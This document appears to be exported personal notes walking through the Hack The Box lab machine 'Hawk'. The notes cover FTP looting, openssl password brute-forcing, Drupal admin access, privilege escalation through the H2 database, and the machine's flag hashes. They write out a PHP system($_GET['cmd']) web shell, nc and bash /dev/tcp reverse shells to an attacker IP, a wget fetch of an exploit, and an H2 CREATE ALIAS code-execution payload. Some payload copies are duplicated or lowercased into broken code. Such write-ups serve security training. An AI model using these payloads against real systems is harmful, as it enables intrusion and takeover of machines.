<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>hawk</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#hawk">hawk</a></p>
<ol>
<li><a href="#nmapAuto">nmapAuto</a></li>
<ol>
<li><a href="#vuln scan">vuln scan</a></li>
<li><a href="#udp scan">udp scan</a></li>
<li><a href="#recon">recon</a></li>
</ol>
<li><a href="#http:80, 8082 &amp; 9092">http:80, 8082 &amp; 9092</a></li>
<li><a href="#ftp">ftp</a></li>
<ol>
<li><a href="#drupal.txt.enc">drupal.txt.enc</a></li>
<li><a href="#bruteforce-salted-openssl">bruteforce-salted-openssl</a></li>
<li><a href="#dropal.txt.enc contents">dropal.txt.enc contents</a></li>
</ol>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#dropal login">dropal login</a></li>
<ol>
<li><a href="#droopescan">droopescan</a></li>
<ol>
<li><a href="#enable php module">enable php module</a></li>
<li><a href="#php reverse shell">php reverse shell</a></li>
<li><a href="#php system RCE">php system RCE</a></li>
</ol>
</ol>
</ol>
<li><a href="#priv esc">priv esc</a></li>
<ol>
<li><a href="#LinEnum.sh">LinEnum.sh</a></li>
<li><a href="#easy way (45506.py)">easy way (45506.py)</a></li>
<li><a href="#ippsec way">ippsec way</a></li>
<ol>
<li><a href="#find resused password in /var/www/html settings.php file">find resused password in /var/www/html settings.php file</a></li>
<li><a href="#ssh to port 8082 locally with daniel user">ssh to port 8082 locally with daniel user</a></li>
<li><a href="#H2 exploit">H2 exploit</a></li>
<ol>
<li><a href="#logging in with arbitrary database  name">logging in with arbitrary database  name</a></li>
<li><a href="#RCE">RCE</a></li>
<li><a href="#rev shell">rev shell</a></li>
</ol>
</ol>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>hawk</u></b></h1><img alt="images/1486-1.png" src="images/1486-1.png"/><br/><img alt="images/1486-2.png" src="images/1486-2.png"/></div>
</body></html><div class="page" id="hawk"><h1><b><u>hawk</u></b></h1><img alt="images/1486-1.png" src="images/1486-1.png"/><br/><img alt="images/1486-2.png" src="images/1486-2.png"/></div>
<div class="page" id="nmapAuto"><h1><b><u>nmapAuto</u></b></h1><img alt="images/1502-1.png" src="images/1502-1.png"/><br/><br/><br/><img alt="images/1502-2.png" src="images/1502-2.png"/><br/><br/><br/><img alt="images/1502-3.png" src="images/1502-3.png"/></div>
<div class="page" id="vuln scan"><h1><b><u>vuln scan</u></b></h1><img alt="images/1516-1.png" src="images/1516-1.png"/><br/><br/></div>
<div class="page" id="udp scan"><h1><b><u>udp scan</u></b></h1><span style="color:#24ff00;">snmp is running on the box, we'll keep that in mind</span> <span style="color:#24ff00;">but it is</span><span style="color:#ffff00;"> </span><strong><span style="color:#ffff00;">v3</span></strong><span style="color:#24ff00;"> which means its encrypted,  </span><br/><br/><span style="color:#24ff00;">moving on for now</span><br/><img alt="images/1520-1.png" src="images/1520-1.png"/></div>
<div class="page" id="recon"><h1><b><u>recon</u></b></h1><span style="color:#ffa500;">gobuster/nikto</span><span style="color:#24ff00;"> scans were a bit wanky and uninformative but the droopescan may have potentially interesting information about the box<br/><br/></span><img alt="images/1521-1.png" src="images/1521-1.png"/></div>
<div class="page" id="http:80, 8082 &amp; 9092"><h1><b><u>http:80, 8082 &amp; 9092</u></b></h1><span style="color:#ffa500;">drupal</span><span style="color:#24ff00;"> web server</span><br/><br/><img alt="images/1515-1.png" src="images/1515-1.png"/><br/><br/><span style="color:#24ff00;">box is not allowing remote connections, we can set up a local connection with ssh after we establish a foothold on the box</span><br/><img alt="images/1515-2.png" src="images/1515-2.png"/><br/><br/><br/><span style="color:#24ff00;">not sure what to make of this at the moment, </span>moving on<br/><img alt="images/1515-3.png" src="images/1515-3.png"/><br/><br/></div>
<div class="page" id="ftp"><h1><b><u>ftp</u></b></h1><img alt="images/1519-1.png" src="images/1519-1.png"/><br/><br/><span style="color:#24ff00;">the box has an </span><span style="color:#ffa500;">ftp</span><span style="color:#24ff00;"> server that allows </span><span style="color:#ffff00;">annonymous login</span><span style="color:#24ff00;">, lets check that out</span><br/><br/><img alt="images/1519-2.png" src="images/1519-2.png"/><br/><br/><span style="color:#24ff00;">moving into the messages directory we see there are no files in it, but lets check to see if there are hidden files with </span><strong><span style="color:#ffa500;">ls -la</span></strong><br/><img alt="images/1519-3.png" src="images/1519-3.png"/><br/><br/><span style="color:#24ff00;">we see theres a </span><span style="color:#ffa500;">drupal.txt.enc</span><span style="color:#24ff00;">, lets download it with </span><span style="color:#ffa500;">get</span><br/><img alt="images/1519-4.png" src="images/1519-4.png"/><br/><br/></div>
<div class="page" id="drupal.txt.enc"><h1><b><u>drupal.txt.enc</u></b></h1><span style="color:#24ff00;">lets  first grab the file with </span><span style="color:#ffa500;">get</span><br/><img alt="images/1523-1.png" src="images/1523-1.png"/><br/><br/><span style="color:#24ff00;">we see its </span><span style="color:#ffa500;">openssl</span><span style="color:#24ff00;"> encrypted and </span><span style="color:#ffa500;">base 64 encoded</span><span style="color:#24ff00;">, so lets take it one step at a time and decode it from b64 first</span><br/><img alt="images/1523-2.png" src="images/1523-2.png"/><br/><br/><img alt="images/1523-3.png" src="images/1523-3.png"/><br/><br/><br/><span style="color:#24ff00;">and here's our file, lets decrpt the decoded file now</span><br/><img alt="images/1523-4.png" src="images/1523-4.png"/><br/></div>
<div class="page" id="bruteforce-salted-openssl"><h1><b><u>bruteforce-salted-openssl</u></b></h1><span style="color:#ffff00;">ippsec</span><span style="color:#24ff00;"> points us to the </span><span style="color:#ffa500;">bruteforce-salted-openssl </span><span style="color:#24ff00;">tool to tackle decrypting this file</span><br/><br/><span style="color:#24ff00;">a quick apt search also shows its in the</span><span style="color:#ffff00;"> rolling kali</span><span style="color:#24ff00;"> packages</span><br/><img alt="images/1524-1.png" src="images/1524-1.png"/><br/><img alt="images/1524-2.png" src="images/1524-2.png"/><br/><br/><span style="color:#24ff00;">trying default params we see the script fails, </span><br/><img alt="images/1524-3.png" src="images/1524-3.png"/><br/><br/><span style="color:#24ff00;">but if we change the digest cipher from </span><span style="color:#ffa500;">md5</span><span style="color:#24ff00;"> to </span><span style="color:#ffa500;">sha256</span><span style="color:#24ff00;">....</span><br/><br/><br/><strong><span style="color:#ffa500;">bruteforce-salted-openssl  </span></strong><span style="color:#ffa500;"><br/>      -f /usr/share/wordlist/rockyou.txt <br/>    -d sha256<br/>    -dropal.txt.enc.decoded</span><br/><img alt="images/1524-4.png" src="images/1524-4.png"/><br/><br/>we see our password is <span style="color:#ffff00;">friends</span></div>
<div class="page" id="dropal.txt.enc contents"><h1><b><u>dropal.txt.enc contents</u></b></h1><span style="color:#24ff00;">now that we have the encryption password, lets extract its contents</span><br/><br/><strong><span style="color:#ffa500;">openssl aes-256-cbc -d -in drupal.txt.enc.decoded -out drupal.txt</span></strong><br/><img alt="images/1526-1.png" src="images/1526-1.png"/><br/><br/><span style="color:#24ff00;">portal password is </span><span style="color:#ffff00;">PencilKeyboardScanner123</span><br/><img alt="images/1526-2.png" src="images/1526-2.png"/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">dropal admin access <br/>php filter enabling <br/>reverse shell</span></div>
<div class="page" id="dropal login"><h1><b><u>dropal login</u></b></h1><span style="color:#24ff00;">putting in </span><span style="color:#ffff00;">PencilKeyboardScanner123</span> <br/><img alt="images/1527-1.png" src="images/1527-1.png"/><br/><br/><br/><span style="color:#24ff00;">logs us in as </span><span style="color:#ffff00;">admin</span><span style="color:#24ff00;">!</span> <span style="color:#24ff00;">lets enumerate dropal a bit now with </span><span style="color:#ffa500;">droopescan</span><br/><img alt="images/1527-2.png" src="images/1527-2.png"/><br/><br/></div>
<div class="page" id="droopescan"><h1><b><u>droopescan</u></b></h1><a href="https://github.com/droope/droopescan">droopescan</a><span style="color:#24ff00;"> is available on </span><span style="color:#ffff00;">github</span><br/><br/><span style="color:#24ff00;">this drupal services has a php plugin! since we have admin access to the portal, we can upload </span><span style="color:#ffff00;">RCE</span><span style="color:#24ff00;"> or call a </span><span style="color:#ffff00;">rev shell </span><span style="color:#24ff00;">back to our machine!</span><br/><img alt="images/1525-1.png" src="images/1525-1.png"/></div>
<div class="page" id="enable php module"><h1><b><u>enable php module</u></b></h1><span style="color:#24ff00;">before we can add php code, we have to </span><span style="color:#ffa500;">enable php filtering </span><span style="color:#24ff00;">on the services through the Module feature</span><br/><img alt="images/1530-1.png" src="images/1530-1.png"/><br/><br/><img alt="images/1530-2.png" src="images/1530-2.png"/><br/><img alt="images/1530-3.png" src="images/1530-3.png"/><br/><br/><img alt="images/1530-4.png" src="images/1530-4.png"/><br/><br/><span style="color:#24ff00;">now when writing articles the text format allows php code to be uploaded and executed</span><br/><img alt="images/1530-5.png" src="images/1530-5.png"/><br/><br/></div>
<div class="page" id="php reverse shell"><h1><b><u>php reverse shell</u></b></h1><span style="color:#24ff00;">first move a php-reverse-shell into our working directory, tweak the ip and port</span><br/><br/><img alt="images/1528-1.png" src="images/1528-1.png"/><br/><br/><span style="color:#24ff00;">copy and paste the code into the article body and hit “preview”</span><br/><img alt="images/1528-2.png" src="images/1528-2.png"/><br/><br/><br/><span style="color:#24ff00;">simply previewing the page while having a netcat listener set up will execute our php reverse shell!</span><br/><img alt="images/1528-3.png" src="images/1528-3.png"/><br/><br/><span style="color:#24ff00;">import a shell with python3</span><br/><img alt="images/1528-4.png" src="images/1528-4.png"/><br/><br/><span style="color:#24ff00;">and implement tab autocomplete with </span><span style="color:#ffa500;">stty raw -echo</span><span style="color:#24ff00;"> and </span><span style="color:#ffa500;">fg</span><br/><br/><img alt="images/1528-5.png" src="images/1528-5.png"/></div>
<div class="page" id="php system RCE"><h1><b><u>php system RCE</u></b></h1><span style="color:#24ff00;">we can upload a php rev shell straight up or we can add a php script that will talk to the system and implement RCE for us</span><br/><br/><strong><span style="color:#ffa500;">&lt;?php system($_GET['cmd']); ?&gt;</span></strong><br/><img alt="images/1529-1.png" src="images/1529-1.png"/><br/><br/><img alt="images/1529-2.png" src="images/1529-2.png"/><br/><br/><img alt="images/1529-3.png" src="images/1529-3.png"/><br/><br/><span style="color:#24ff00;">we see we are redirected to the page we created</span><br/><img alt="images/1529-4.png" src="images/1529-4.png"/><br/><br/><span style="color:#24ff00;">and we can add commands to our url to execute them like the following:</span><br/><br/><img alt="images/1529-5.png" src="images/1529-5.png"/><br/><br/><img alt="images/1529-6.png" src="images/1529-6.png"/><br/><br/><br/><span style="color:#24ff00;">lets execute a bash reverse shell from pentestmonkey</span><br/><br/><strong><span style="color:#ffa500;">nc -e /bin/bash 10.10.14.62 4444</span></strong> (url encode it w/ ctrl+U) <span style="color:#ffa500;">bash+-c+'bash+&gt;%26+/dev/tcp/10.10.14.62/4444+0&gt;%261'</span><br/><img alt="images/1529-7.png" src="images/1529-7.png"/><br/><br/><br/><img alt="images/1529-8.png" src="images/1529-8.png"/><br/><br/><img alt="images/1529-9.png" src="images/1529-9.png"/></div>
<div class="page" id="priv esc"><h1><b><u>priv esc</u></b></h1>LinEnum to finding H2 service running<br/><br/>easy way and ippsec's way</div>
<div class="page" id="LinEnum.sh"><h1><b><u>LinEnum.sh</u></b></h1><span style="color:#24ff00;">we all know the drill by now, set up and http server with LinEnum.sh and upload it to the victim<br/><br/></span><img alt="images/1536-1.png" src="images/1536-1.png"/><br/><br/><img alt="images/1536-2.png" src="images/1536-2.png"/><br/><br/><img alt="images/1536-3.png" src="images/1536-3.png"/><br/><br/><span style="color:#24ff00;">The H2 database is run with root privileges. Let’s check access to the /opt/h2 directory.</span><br/><img alt="images/1536-4.png" src="images/1536-4.png"/></div>
<div class="page" id="easy way (45506.py)"><h1><b><u>easy way (45506.py)</u></b></h1><span style="color:#ffa500;">searchsploit H2</span><br/><img alt="images/1535-1.png" src="images/1535-1.png"/><br/><img alt="images/1535-2.png" src="images/1535-2.png"/><br/><br/><span style="color:#24ff00;">RCE and we're running the process as root already, lets take a closer look at </span><span style="color:#ffa500;">45506.py</span><br/><br/><img alt="images/1535-3.png" src="images/1535-3.png"/><br/><br/><span style="color:#24ff00;">lets give it a shot</span><br/><br/><span style="color:#24ff00;">first mirror it over to our directory</span><br/><span style="color:#ffa500;">searchsploit -m java/webapps/45506.py</span><br/><img alt="images/1535-4.png" src="images/1535-4.png"/><br/><br/><br/><span style="color:#24ff00;">upload it to our victim</span><br/><img alt="images/1535-5.png" src="images/1535-5.png"/><br/><br/><span style="color:#ffa500;">wget 10.10.14.62:5555/45506.py</span><br/><img alt="images/1535-6.png" src="images/1535-6.png"/><br/><br/><span style="color:#24ff00;">and run it pointing to h2's service running on port 8082 </span><br/><img alt="images/1535-7.png" src="images/1535-7.png"/><br/><br/><span style="color:#24ff00;">win</span><br/><img alt="images/1535-8.png" src="images/1535-8.png"/><br/><br/><br/><br/><br/></div>
<div class="page" id="ippsec way"><h1><b><u>ippsec way</u></b></h1>going into the <span style="color:#ffa500;">/var/www/html </span>directory<br/></div>
<div class="page" id="find resused password in /var/www/html settings.php file"><h1><b><u>find resused password in /var/www/html settings.php file</u></b></h1><span style="color:#24ff00;">we can use grep in </span><span style="color:#ffa500;">/var/www/html </span><span style="color:#24ff00;">to search recursively for “</span><span style="color:#ffff00;">password</span><span style="color:#24ff00;">" strings</span><br/><br/><strong><span style="color:#ffa500;">grep -R password</span></strong><br/><img alt="images/1541-1.png" src="images/1541-1.png"/><br/><br/><span style="color:#24ff00;">we see this databases array has a </span><span style="color:#ffff00;">drupal4hawk</span><span style="color:#24ff00;"> password, lets see if the password is reused<br/><br/>since our original openssl password was for a </span><span style="color:#ffff00;">daniel</span><span style="color:#24ff00;">, lets try those creds to connect to him</span><br/><br/><span style="color:#ffff00;">we're in!</span><br/><img alt="images/1541-2.png" src="images/1541-2.png"/><br/><br/><br/><span style="color:#24ff00;">NOTE: we can spawn a </span><span style="color:#ffa500;">shell</span><span style="color:#24ff00;"> here with </span><span style="color:#ffa500;">os</span><br/><br/><img alt="images/1541-3.png" src="images/1541-3.png"/><img alt="images/1541-4.png" src="images/1541-4.png"/><br/><br/><img alt="images/1541-5.png" src="images/1541-5.png"/><br/><img alt="images/1541-6.png" src="images/1541-6.png"/></div>
<div class="page" id="ssh to port 8082 locally with daniel user"><h1><b><u>ssh to port 8082 locally with daniel user</u></b></h1><span style="color:#24ff00;">recalling trying to connect to port 8082 earlier....</span><br/><img alt="images/1542-1.png" src="images/1542-1.png"/><img alt="images/1542-2.png" src="images/1542-2.png"/><br/><span style="color:#24ff00;">we can use ssh here to connect to port 8082 locally on our victim</span><br/><br/><strong><span style="color:#ffa500;">ssh -L 9003:127.0.0.1:8082 daniel@10.10.10.102</span></strong><br/><img alt="images/1542-3.png" src="images/1542-3.png"/><br/><br/><strong><span style="color:#24ff00;">since we set up our local port 9003 (cause it's over 9000) to connect to port 8082 locally from our victim, we are now free to connect to port 8082 via our local port 9003</span></strong><br/><img alt="images/1542-4.png" src="images/1542-4.png"/><br/><br/><img alt="images/1542-5.png" src="images/1542-5.png"/></div>
<div class="page" id="H2 exploit"><h1><b><u>H2 exploit</u></b></h1><span style="color:#ffff00;">ippsec</span> <span style="color:#24ff00;">refers us to this google page:</span><br/><br/><img alt="images/1543-1.png" src="images/1543-1.png"/><br/><br/><span style="color:#24ff00;">we can use an arbitrary database name to execute code from the </span><span style="color:#ffa500;">H2</span><span style="color:#24ff00;"> data base with the following script according to the article</span><br/><br/><code>CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;<br/>CALL SHELLEXEC('id')CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;<br/>CALL SHELLEXEC('id')</code><br/><img alt="images/1543-2.png" src="images/1543-2.png"/></div>
<div class="page" id="logging in with arbitrary database  name"><h1><b><u>logging in with arbitrary database  name</u></b></h1><img alt="images/1544-1.png" src="images/1544-1.png"/><br/><br/><img alt="images/1544-2.png" src="images/1544-2.png"/></div>
<div class="page" id="RCE"><h1><b><u>RCE</u></b></h1><code><span style="color:#ffa500;">create alias shellexec as $$ string shellexec(string cmd) throws java.io.ioexception { java.util.scanner s = new java.util.scanner(runtime.getruntime().exec(cmd).getinputstream()).usedelimiter("\\a"); return s.hasnext() ? s.next() : "";  }$$;<br/>call shellexec('id')create alias shellexec as $$ string shellexec(string cmd) throws java.io.ioexception { java.util.scanner s = new java.util.scanner(runtime.getruntime().exec(cmd).getinputstream()).usedelimiter("\\a"); return s.hasnext() ? s.next() : "";  }$$;<br/>call shellexec('id')</span></code><br/><br/><span style="color:#24ff00;">we see id is run at the bottom of the screen, all we need to do is call a shell back to our attack machine as root</span><br/><img alt="images/1545-1.png" src="images/1545-1.png"/></div>
<div class="page" id="rev shell"><h1><b><u>rev shell</u></b></h1><img alt="images/1546-1.png" src="images/1546-1.png"/><br/><span style="color:#24ff00;">lets create a file exec.sh and run it via h2</span><br/><br/><img alt="images/1546-2.png" src="images/1546-2.png"/><br/><img alt="images/1546-3.png" src="images/1546-3.png"/><br/><br/><br/><code><span style="color:#ffa500;">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;<br/>CALL SHELLEXEC('id')CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;<br/>CALL SHELLEXEC('/tmp/exec.sh')</span></code><br/><br/><img alt="images/1546-4.png" src="images/1546-4.png"/><br/><br/><img alt="images/1546-5.png" src="images/1546-5.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1537-1.png" src="images/1537-1.png"/><span style="color:#ffff00;"><br/>d5111d4f75370ebd01cdba5b32e202a8<br/><br/></span><img alt="images/1537-2.png" src="images/1537-2.png"/><br/>54f3e840fe5564b42a8320fd2b608ba0</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1547-1.png" src="images/1547-1.png"/></div>
</div></body></html>